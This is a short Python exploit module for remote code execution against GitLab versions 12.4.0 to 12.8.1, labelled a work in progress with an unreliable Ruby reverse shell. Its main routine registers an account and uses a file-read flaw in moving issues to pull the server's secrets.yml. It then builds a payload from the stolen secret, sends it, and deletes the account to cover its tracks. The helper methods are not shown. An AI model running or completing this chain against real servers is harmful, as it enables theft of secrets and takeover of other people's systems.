# -*- coding: utf-8 -*-
from . import helpers

class GitlabRCE1281RCE(GitlabRCE1281LFI):
    description = "RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP"

    def __init__(self):
      pass

    

    def main(self):
        self.file_to_lfi = "/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"
        self.register_user()
        self.create_empty_project()
        self.create_empty_project()
        self.create_issue(self.projects[0], self.lfi_path())
        file_contents = self.exploit_move_issue()
        secret = self.parse_secrets(file_contents)
        payload = self.build_payload(secret)
        self.send_payload(payload)
        self.delete_user()